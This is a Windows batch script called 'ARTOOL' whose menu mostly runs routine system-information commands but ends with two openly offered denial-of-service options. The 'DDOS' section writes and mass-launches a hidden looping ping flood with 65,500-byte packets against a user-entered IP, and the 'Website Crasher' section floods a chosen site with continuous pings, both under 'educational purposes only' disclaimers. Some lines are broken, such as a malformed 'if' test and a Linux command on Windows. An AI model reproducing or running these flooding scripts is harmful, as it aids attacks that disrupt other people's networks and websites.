@echo off
:x
cls 
chcp 65001 >nul
echo  █████╗ ██████╗ ████████╗ ██████╗  ██████╗ ██╗     
echo ██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║     
echo ███████║██████╔╝   ██║   ██║   ██║██║   ██║██║     
echo ██╔══██║██╔══██╗   ██║   ██║   ██║██║   ██║██║     
echo ██║  ██║██║  ██║   ██║   ╚██████╔╝╚██████╔╝███████╗
echo ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
pause
echo.          select option
echo 1. Know your IP
echo 2. Know others IP
echo 3. System information
echo 4. List running processes
echo 5. Check disk
echo 6. Network statistics
echo 7. DNS cache
echo 8. Open ports
echo 9. Trace route
echo 10. File search
echo 11. Directory size
echo 12. Battery report
echo 13. Windows updates
echo 14. Disk space
echo 15. Memory usage
echo 16. CPU info
echo 17. Network adapters
echo 18. Installed programs
echo 19. System drivers
echo 20. User accounts
echo 21. Scheduled tasks
echo 22. Firewall status
echo 23. Shared folders
echo 24. Group policies
echo 25. System restore points
echo 26. Environment variables
echo 27. Windows services
echo 28. Power configuration
echo 29. USB devices
echo 30. Sound devices
echo 31. Printer list
echo 32. System file check
echo 33. Startup programs
echo 34. Network connections
echo 35. Windows features
echo 36. System uptime
echo 37. Wi-Fi profiles
echo 38. Bluetooth devices
echo 39. Display adapters
echo 40. Disk partitions
echo 41. Event logs
echo 42. Windows activation status
echo 43. Installed hotfixes
echo 44. BIOS information
echo 45. System locale
echo 46. Time zone information
echo 47. Mapped network drives
echo 48. Hyper-V status
echo 49. Windows Defender status
echo 50. Windows Firewall rules
echo 51. List installed fonts
echo 52. Check file system
echo 53. View routing table
echo 54. List user groups
echo 55. Show Windows version
echo 56. Display MAC address
echo 57. Check disk fragmentation
echo 58. View system error report
echo 59. List installed codecs
echo 60. Show power schemes
echo 61. Display monitor information
echo 62. List network protocols
echo 63. View COM ports
echo 64. Show Windows license info
echo 65. List installed .NET versions
echo 66. Display computer name
echo 67. Show Windows folders
echo 68. List running services
echo 69. Display IP configuration
echo 70. Show system files
echo 71. List user privileges
echo 72. Display DNS servers
echo 73. Show Windows features
echo 74. List installed drivers
echo 75. Display system variables
echo 76. Show network shares
echo 77. List installed updates
echo 78. Display system info summary
echo 79. Show active connections
echo 80. List disk volumes
echo 81. Display processor info
echo 82. Show Windows activation
echo 83. List installed apps
echo 84. Display system restore config
echo 85. Show network statistics
echo 86. List system devices
echo 87. Display power status
echo 88. Show Windows components
echo 89. List user profiles
echo 90. Display system errors
echo 91. Show Windows security center
echo 92. List scheduled tasks
echo 93. Display system performance
echo 94. Show Windows defender info
echo 95. List network interfaces
echo 96. Display system properties
echo 97. Show Windows update history
echo 98. List installed printers
echo 99. Display system boot config
echo 100. Show Windows event logs
echo 101. DDOS USE AT OWN RISK
echo 102. WEBSITE DENIAL OF SERVICE USE AT OWN RISK
echo.
set /p q=Enter your choice (1-102): 

if "%q%"=="1" goto knowyourip
if "%q%"=="2" goto knowothersip
if "%q%"=="3" goto sysinfo
if "%q%"=="4" goto processes
if "%q%"=="5" goto checkdisk
if "%q%"=="6" goto netstats
if "%q%"=="7" goto dnscache
if "%q%"=="8" goto openports
if "%q%"=="9" goto traceroute
if "%q%"=="10" goto filesearch
if "%q%"=="11" goto dirsize
if "%q%"=="12" goto batteryreport
if "%q%"=="13" goto winupdates
if "%q%"=="14" goto diskspace
if "%q%"=="15" goto memusage
if "%q%"=="16" goto cpuinfo
if "%q%"=="17" goto netadapters
if "%q%"=="18" goto installedprograms
if "%q%"=="19" goto systemdrivers
if "%q%"=="20" goto useraccounts
if "%q%"=="21" goto scheduledtasks
if "%q%"=="22" goto firewallstatus
if "%q%"=="23" goto sharedfolders
if "%q%"=="24" goto grouppolicies
if "%q%"=="25" goto systemrestore
if "%q%"=="26" goto envvariables
if "%q%"=="27" goto winservices
if "%q%"=="28" goto powerconfig
if "%q%"=="29" goto usbdevices
if "%q%"=="30" goto sounddevices
if "%q%"=="31" goto printerlist
if "%q%"=="32" goto sysfilecheck
if "%q%"=="33" goto startupprograms
if "%q%"=="34" goto networkconnections
if "%q%"=="35" goto windowsfeatures
if "%q%"=="36" goto systemuptime
if "%q%"=="37" goto wifiprofiles
if "%q%"=="38" goto bluetoothdevices
if "%q%"=="39" goto displayadapters
if "%q%"=="40" goto diskpartitions
if "%q%"=="41" goto eventlogs
if "%q%"=="42" goto winactivation
if "%q%"=="43" goto installedhotfixes
if "%q%"=="44" goto biosinfo
if "%q%"=="45" goto systemlocale
if "%q%"=="46" goto timezoneinfo
if "%q%"=="47" goto mappeddrives
if "%q%"=="48" goto hypervstatus
if "%q%"=="49" goto windefenderstatus
if "%q%"=="50" goto firewallrules
if "%q%"=="51" goto listfonts
if "%q%"=="52" goto checkfilesystem
if "%q%"=="53" goto viewroutingtable
if "%q%"=="54" goto listusergroups
if "%q%"=="55" goto showwinversion
if "%q%"=="56" goto displaymacaddress
if "%q%"=="57" goto checkdiskfrag
if "%q%"=="58" goto viewsyserrorreport
if "%q%"=="59" goto listcodecs
if "%q%"=="60" goto showpowerschemes
if "%q%"=="61" goto displaymonitorinfo
if "%q%"=="62" goto listnetprotocols
if "%q%"=="63" goto viewcomports
if "%q%"=="64" goto showwinlicense
if "%q%"=="65" goto listnetversions
if "%q%"=="66" goto displaycomputername
if "%q%"=="67" goto showwinfolders
if "%q%"=="68" goto listrunningservices
if "%q%"=="69" goto displayipconfig
if "%q%"=="70" goto showsystemfiles
if "%q%"=="71" goto listuserprivileges
if "%q%"=="72" goto displaydnsservers
if "%q%"=="73" goto showwinfeatures
if "%q%"=="74" goto listinstalledrivers
if "%q%"=="75" goto displaysysvariables
if "%q%"=="76" goto shownetworkshares
if "%q%"=="77" goto listinstalledupdates
if "%q%"=="78" goto displaysysinfosummary
if "%q%"=="79" goto showactiveconnections
if "%q%"=="80" goto listdiskvolumes
if "%q%"=="81" goto displayprocessorinfo
if "%q%"=="82" goto showwinactivation
if "%q%"=="83" goto listinstalledapps
if "%q%"=="84" goto displaysysrestoreconfig
if "%q%"=="85" goto shownetstats
if "%q%"=="86" goto listsysdevices
if "%q%"=="87" goto displaypowerstatus
if "%q%"=="88" goto showwincomponents
if "%q%"=="89" goto listuserprofiles
if "%q%"=="90" goto displaysyserrors
if "%q%"=="91" goto showwinsecuritycenter
if "%q%"=="92" goto listscheduledtasks
if "%q%"=="93" goto displaysysperformance
if "%q%"=="94" goto showwindefenderinfo
if "%q%"=="95" goto listnetinterfaces
if "%q%"=="96" goto displaysysproperties
if "%q%"=="97" goto showwinupdatehistory
if "%q%"=="98" goto listinstalledprinters
if "%q%"=="99" goto displaysysbootconfig
if "%q%"=="100" goto showwineventlogs
if "%q%"=="101" goto DDOS
if "%q%"=="102" goto Web
goto x

:knowyourip
ipconfig
pause
goto x

:knowothersip
arp -a
pause
goto x

:sysinfo
systeminfo
pause
goto x

:processes
tasklist
pause
goto x

:checkdisk
echo Running check disk on C: drive...
chkdsk C:
pause
goto x

:netstats
netstat -an
pause
goto x

:dnscache
ipconfig /displaydns
pause
goto x

:openports
netstat -an | find /i "listening"
pause
goto x

:traceroute
set /p target=Enter the target IP or domain: 
tracert %target%
pause
goto x

:filesearch
set /p searchterm=Enter the file name to search for: 
set /p searchpath=Enter the path to search in (e.g., C:\): 
dir /s /b "%searchpath%\*%searchterm%*"
pause
goto x

:dirsize
set /p dirpath=Enter the directory path: 
dir "%dirpath%" /s /-c | findstr /i "bytes"
pause
goto x

:batteryreport
powercfg /batteryreport
echo Battery report generated. Please check your Windows directory.
pause
goto x

:winupdates
wuauclt /detectnow
echo Windows Update check initiated.
pause
goto x

:diskspace
wmic logicaldisk get deviceid,size,freespace,description
pause
goto x

:memusage
wmic OS get FreePhysicalMemory,TotalVisibleMemorySize /Value
pause
goto x

:cpuinfo
wmic cpu get caption,deviceid,name,numberofcores,maxclockspeed,status
pause
goto x

:netadapters
wmic nicconfig get description,ipaddress,macaddress
pause
goto x

:installedprograms
wmic product get name,version
pause
goto x

:systemdrivers
driverquery
pause
goto x

:useraccounts
net user
pause
goto x

:scheduledtasks
schtasks /query
pause
goto x

:firewallstatus
netsh advfirewall show allprofiles
pause
goto x

:sharedfolders
net share
pause
goto x

:grouppolicies
gpresult /r
pause
goto x

:systemrestore
vssadmin list shadows
pause
goto x

:envvariables
set
pause
goto x

:winservices
sc query
pause
goto x

:powerconfig
powercfg /list
pause
goto x

:usbdevices
wmic path Win32_USBControllerDevice get Dependent
pause
goto x

:sounddevices
wmic sounddev get caption,deviceid,status
pause
goto x

:printerlist
wmic printer get name,portname,drivername
pause
goto x

:sysfilecheck
sfc /scannow
pause
goto x

:startupprograms
wmic startup get caption,command
pause
goto x

:networkconnections
netstat -e
pause
goto x

:windowsfeatures
dism /online /get-features
pause
goto x

:systemuptime
net statistics workstation | find "Statistics since"
pause
goto x

:wifiprofiles
netsh wlan show profiles
pause
goto x

:bluetoothdevices
powershell "Get-PnpDevice -Class Bluetooth"
pause
goto x

:displayadapters
wmic path win32_videocontroller get caption,driverversion
pause
goto x

:diskpartitions
wmic partition get name,size,type
pause
goto x

:eventlogs
wevtutil el
pause
goto x

:winactivation
slmgr /xpr
pause
goto x

:installedhotfixes
wmic qfe list brief
pause
goto x

:biosinfo
wmic bios get manufacturer,name,version
pause
goto x

:systemlocale
wmic os get locale
pause
goto x

:timezoneinfo
tzutil /g
pause
goto x

:mappeddrives
net use
pause
goto x

:hypervstatus
systeminfo | findstr /i "Hyper-V"
pause
goto x

:windefenderstatus
powershell "Get-MpComputerStatus"
pause
goto x

:firewallrules
netsh advfirewall firewall show rule name=all
pause
goto x

:listfonts
fc-list
pause
goto x

:checkfilesystem
chkdsk
pause
goto x

:viewroutingtable
route print
pause
goto x

:listusergroups
net localgroup
pause
goto x

:showwinversion
ver
pause
goto x

:displaymacaddress
getmac
pause
goto x

:checkdiskfrag
defrag C: /A
pause
goto x

:viewsyserrorreport
eventvwr
pause
goto x

:listcodecs
dxdiag
pause
goto x

:showpowerschemes
powercfg /L
pause
goto x

:displaymonitorinfo
wmic desktopmonitor get /format:list
pause
goto x

:listnetprotocols
netsh winsock show catalog
pause
goto x

:viewcomports
mode
pause
goto x

:showwinlicense
slmgr /dlv
pause
goto x

:listnetversions
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP"
pause
goto x

:displaycomputername
hostname
pause
goto x

:show
:showwinfolders
dir %windir% /AD
pause
goto x

:listrunningservices
net start
pause
goto x

:displayipconfig
ipconfig /all
pause
goto x

:showsystemfiles
dir /A:S C:\
pause
goto x

:listuserprivileges
whoami /priv
pause
goto x

:displaydnsservers
ipconfig /all | findstr "DNS Servers"
pause
goto x

:showwinfeatures
dism /online /get-features
pause
goto x

:listinstalledrivers
driverquery
pause
goto x

:displaysysvariables
set
pause
goto x

:shownetworkshares
net share
pause
goto x

:listinstalledupdates
wmic qfe list brief
pause
goto x

:displaysysinfosummary
systeminfo | findstr /c:"OS Name" /c:"OS Version" /c:"System Manufacturer" /c:"System Model" /c:"System Type" /c:"Total Physical Memory"
pause
goto x

:showactiveconnections
netstat -ano
pause
goto x

:listdiskvolumes
wmic logicaldisk get caption,description,providername
pause
goto x

:displayprocessorinfo
wmic cpu get name, maxclockspeed, numberofcores, numberoflogicalprocessors
pause
goto x

:showwinactivation
slmgr /xpr
pause
goto x

:listinstalledapps
wmic product get name, version
pause
goto x

:displaysysrestoreconfig
vssadmin list shadowstorage
pause
goto x

:shownetstats
netstat -e
pause
goto x

:listsysdevices
wmic computersystem get model,manufacturer,systemtype
pause
goto x

:displaypowerstatus
powercfg /energy
pause
goto x

:showwincomponents
dism /online /get-features
pause
goto x

:listuserprofiles
dir C:\Users
pause
goto x

:displaysyserrors
eventvwr
pause
goto x

:showwinsecuritycenter
wscui.cpl
pause
goto x

:listscheduledtasks
schtasks /query
pause
goto x

:displaysysperformance
perfmon /rel
pause
goto x

:showwindefenderinfo
powershell "Get-MpComputerStatus"
pause
goto x

:listnetinterfaces
netsh interface show interface
pause
goto x

:displaysysproperties
sysdm.cpl
pause
goto x

:showwinupdatehistory
wmic qfe list brief
pause
goto x

:listinstalledprinters
wmic printer get name
pause
goto x

:displaysysbootconfig
bcdedit
pause
goto x

:showwineventlogs
wevtutil el
pause
goto x

@echo off

:DDOS
cls
chcp 65001 > nul
color d

echo ████████▄  ████████▄   ▄██████▄     ▄████████ 
echo ███   ▀███ ███   ▀███ ███    ███   ███    ███ 
echo ███    ███ ███    ███ ███    ███   ███    █▀  
echo ███    ███ ███    ███ ███    ███   ███        
echo ███    ███ ███    ███ ███    ███ ▀███████████ 
echo ███    ███ ███    ███ ███    ███          ███ 
echo ███   ▄███ ███   ▄███ ███    ███    ▄█    ███ 
echo ████████▀  ████████▀   ▀██████▀   ▄████████▀ 
pause
echo ___________________________________________________________
echo   
echo               FOR EDUCATIONAL PURPOSES ONLY 
echo ___________________________________________________________
echo 			USE AT OWN RISK
echo           I AM NOT RESPONSIBLE FOR YOUR ACTIONS


if exist %userprofile%\key goto skip
  cls
  echo verifiedbypass>%userprofile%\key
  md %temp%\DDOST\
  md %userprofile%\.ddost\
  md %userprofile%\.ddost\data\
  attrib +h %temp%\DDOST\

:skip
  echo IP:
  set /p ip=
    cls
      echo Amount of windows:
  set /p windows=
    cls
      echo @echo off>>"%temp%\DDOST\run.bat"
      echo :loop>>"%temp%\DDOST\run.bat"
      echo ping %ip% -n 1 -l 65500>>"%temp%\DDOST\run.bat"
      echo goto loop>>"%temp%\DDOST\run.bat"
      echo Minimize Windows (Y/N):
  set /p mintf=
    cls
      if "%mintf%"=="Y" set mintf=/min
      if "%mintf%"=="N" set mintf=

for /l %%A in (1,1,%windows%) do start %mintf% "cmd.exe" "%temp%\DDOST\run.bat"
echo Press any button to exit
  pause >nul
    del /q "%temp%\DDOST\run.bat"
    timeout /t 1
    taskkill /f /t /im cmd.exe
pause
goto x

:Web
@echo off
title website dos
color d
chcp 65001 >nul
echo [35m ████████▄   ▄██████▄     ▄████████ [0m
echo [35m ███   ▀███ ███    ███   ███    ███ [0m
echo [35m ███    ███ ███    ███   ███    █▀ [0m 
echo [36m ███    ███ ███    ███   ███ [0m       
echo [36m ███    ███ ███    ███ ▀███████████ [0m
echo [96m ███    ███ ███    ███          ███ [0m
echo [96m ███   ▄███ ███    ███    ▄█    ███ [0m
echo [96m ████████▀   ▀██████▀   ▄████████▀  [0m
pause
echo =================================================================== 
echo                         USE AT OWN RISK                               
echo ===================================================================
echo                   WEBSITE DENIAL OF SERVICE
echo ===================================================================
echo                   EDUCATIONAL PURPOSES ONLY 
echo ===================================================================
pause
set /p q = Would you like to continue? (y,n)
if "%q%"=="y" goto dos
if "%q%"=="n" goto x
:dos
Title Website Crasher
color 0e
echo Enter the website you would like to crash
set input=
set /p input= Enter your Website here:
if %input%==goto A if NOT B
echo Processing Your request
ping localhost>nul
echo To end Crashing press CTRL + C
ping localhost>nul
cls
echo ----------------------------------------------------------------------
echo Now Crashing Website...DO NOT CLOSE THIS BOX!! PRESS CRTL + C TO END!!
echo ----------------------------------------------------------------------
ping %input% -t -l 1000
pause
goto x
